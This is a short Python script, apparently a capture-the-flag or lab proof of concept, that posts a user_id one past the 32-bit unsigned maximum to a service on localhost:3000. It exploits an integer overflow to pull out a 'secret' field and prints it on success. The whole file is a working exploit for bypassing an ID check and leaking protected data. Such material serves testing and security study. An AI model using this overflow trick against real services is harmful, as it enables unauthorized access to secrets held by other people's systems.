#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"
INT_MAX = 4294967295


r = requests.post(URL, json={"user_id": INT_MAX + 1}).json()
if "secret" in r:
    print("[+] Found secret:", r["secret"])
    exit(0)
